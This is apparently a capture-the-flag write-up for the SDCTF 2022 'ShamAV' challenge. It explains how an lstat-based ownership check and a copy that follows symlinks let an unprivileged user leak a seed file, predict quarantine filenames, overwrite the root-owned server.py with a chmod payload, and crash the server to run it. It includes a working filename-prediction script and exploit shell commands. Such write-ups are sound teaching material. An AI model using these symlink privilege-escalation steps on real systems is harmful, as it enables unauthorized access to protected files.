---
title: "[Pwn] ShamAV [SDCTF 2022]"
date: 2022-05-09 18:39:00
---

# 0x0 Introduction

We just developed a new anti-virus called ShamAV. Have fun!

Connect via
socat FILE:`tty`,raw,echo=0 TCP:shamav.sdc.tf:1337

Flag path (Unix permission of flag is intended)
/home/antivirus/flag.txt

Note
Ignore directory /home/user, you don't need to access anything under it to get the flag
By k3v1n

# 0x1 Vulnerability

this challenge is basically manipulating with symbolic links. 

First bug is `os.lstat(path).st_uid != USER_UID` in `server.py`.

According to man page, `lstate()` will return the property of symbolic not the real file. 

>lstat() is identical to stat(), except that if pathname is a symbolic link, then it returns information about the link itself, not the file that the link refers to.

We can bypass this check by creating a symbolic link to the file that is not owned by us.

Second vuln is also related to symbolic links

if we have symbolic link point to anther file, overwrite this symbolic link would actually overwrite the real file.

Combine those two vuln, we can get `seed` first, then predict next filename, create symbolic link point to `server.py`.

Then, we scan our new file, which will overwrite `server.py`.

After than, we crash `server.py`, let `launcher.sh` to restart `server.py` and execute our code.

# 0x3 Walk through


## first glance
challenge only provide a host and port, no other thing. But I can get everything I need through the shell.

connect to server, firstly I checked the permission of the flag.txt. flag.txt is owned by antivirus, but didn't have any permission. So, I need find a way to change the permission and read the flag.

```
ctf@SHAMAV:~$ whoami
ctf
ctf@SHAMAV:~$ ls -al /home/antivirus
total 28
drwxr-xr-x 3 antivirus antivirus  200 May 10 04:27 .
drwxr-xr-x 5 nobody    nogroup   4096 May  4 23:22 ..
-rw-r--r-- 1 antivirus antivirus  697 May 10 04:27 av.log
---------- 1 antivirus antivirus   44 May 10 04:27 flag.txt
-rwxr-xr-x 1 antivirus antivirus  673 May 10 04:27 launcher.sh
-rw-r--r-- 1 antivirus antivirus  260 May 10 04:27 malware-hashes.txt
drwxrwxrwx 2 antivirus antivirus   40 May 10 04:27 quarantine
-rw------- 1 antivirus antivirus   45 May 10 04:27 seed
-rwxr-xr-x 1 antivirus antivirus 2643 May 10 04:27 server.py
srwxrwxrwx 1 antivirus antivirus    0 May 10 04:27 socket
```

then I looked at the `scan` file under /home/ctf/bin. uhhh, its just a script, and how `scan` works is sending file path to a socket, then retrieve result from that socket. 

```bash
# basically this file
(echo -n "file_path" | socat - "UNIX-CONNECT:/home/antivirus/socket")
```

if we scan a file, the file will be copy to `/home/antivirus/quarantine` with a random generated name. Moreover, this file is owned by `antivirus`!

```
ctf@SHAMAV:~/virus-samples$ scan phishing.py
ctf@SHAMAV:~/virus-samples$ ls -al /home/antivirus/quarantine
total 4
drwxrwxrwx 2 antivirus antivirus  60 May 10 04:37 .
drwxr-xr-x 3 antivirus antivirus 200 May 10 04:27 ..
-rw-r--r-- 1 antivirus antivirus 177 May 10 04:37 sham-av-8a8b989c85011653db080d7e26f7175c04a9772c5845884a2e86c42fb3f17df6
```

## analysis

lets analysis two file that are responsible for the antivirus system. [`server.py`](server.py) and [`launcher.sh`](launcher.sh)

**[server.py](server.py)**

- check if file is owned by `ctf`, `os.lstat(path).st_uid != USER_UID`
- copy file to `/home/antivirus/quarantine` using `shutil.copyfile(path, target_path)`. target name is determined by a seed

the check can be easily bypassed by creating a symbolic link as i mentioned in the vulnerability section


**[launcher.sh](launcher.sh)**

- start server.py
- restart server.py if server.py crash.


filename is generate by following function, so if I know the seed, I can predict the filename that will be generated in the future.

```python
def genrandom():
    global ctr
    result = hashlib.sha256(ctr.to_bytes(CTR_LENGTH, byteorder='little') + seed).hexdigest()
    ctr += 1
    return result
```

## the idea

I come up with following basic idea

1. modify `server.py` so that it execute `chmod 777 flag.txt`
2. find way to crash `server.py`
3. `launcher.sh` will execute `chmod 777 flag.txt` and I can cat flag

crash `server.py` is pretty easy, we create a symlink to `flag.txt`, and pass `flag.txt` to the server. since `flag.txt` is not readable, the program will throw an exception and crash.

modify `server.py` is bit tricky. 

In server.py, we have `shutil.copyfile(path, target_path)` that copy file. If the `target_path` exists and it is a symbolic link, this will overwrite the real file. Using this, I can overwrite `server.py`

But how can i predict the filename, I need seed to do that. 

Obtain `seed` is also easy.

although ctf user don't have read permission on `seed` file, I can "scan" `seed` file and obtain seed from the file copied by `server.py`


## final idea

1. create symlink to `seed`, send `seed` to server and get seed
2. predict next filename, create symlink point to `server.py` using that name
3. create a file and execute `chmod 777 flag.txt`, scan this file and overwrite `server.py`
4. create symlink to `flag.txt`, send `flag.txt` to server and crash the server
5. `launcher.sh` will execute code and I can cat flag.


# 0x4 Exploit

file_name_predict.py
```python
#! /usr/bin/env python3
import base64, socket, os, hashlib, shutil, sys
USER_UID = 1002
CTR_LENGTH = 256
STDIO_DEBUG = False
seed = "ZFhtPShqL2BjJQw7MwAPBjEwMolJ6qndj4v9v+2vEK8=" # seed from seed file
ctr = 0

seed = base64.b64decode(seed)

def genrandom():
    global ctr
    result = hashlib.sha256(ctr.to_bytes(CTR_LENGTH, byteorder='little') + seed).hexdigest()
    ctr += 1
    return result

print(f'/home/antivirus/quarantine/sham-av-{genrandom()}')
print(f'/home/antivirus/quarantine/sham-av-{genrandom()}')
print(f'/home/antivirus/quarantine/sham-av-{genrandom()}')
```

exploit
```bash
ln -s /home/antivirus/seed /home/ctf/seed
echo -n "/home/ctf/seed" | socat - "UNIX-CONNECT:/home/antivirus/socket"

ln -s /home/antivirus/server.py /home/antivirus/quarantine/sham-av-b5d2c8eb62cf9108369b50d1f4a5928821b2e28f3b5606009285a502c96c1a8f # the predict filename

printf "#! /usr/bin/env python3\nimport os\nos.system('chmod 777 flag.txt')" > /home/ctf/x
echo -n "/home/ctf/x" | socat - "UNIX-CONNECT:/home/antivirus/socket"

ls -al /home/antivirus/quarantine
cat /home/antivirus/server.py

ln -s /home/antivirus/flag.txt /home/ctf/flag.txt
echo -n "/home/ctf/flag.txt" | socat - "UNIX-CONNECT:/home/antivirus/socket"

ls -al /home/antivirus/
cat /home/antivirus/flag.txt
```

# 0x4 Flag

sdctf{5ymL1Nks_ar3_4_curs3d_f3a7uRe_0f_*NIX}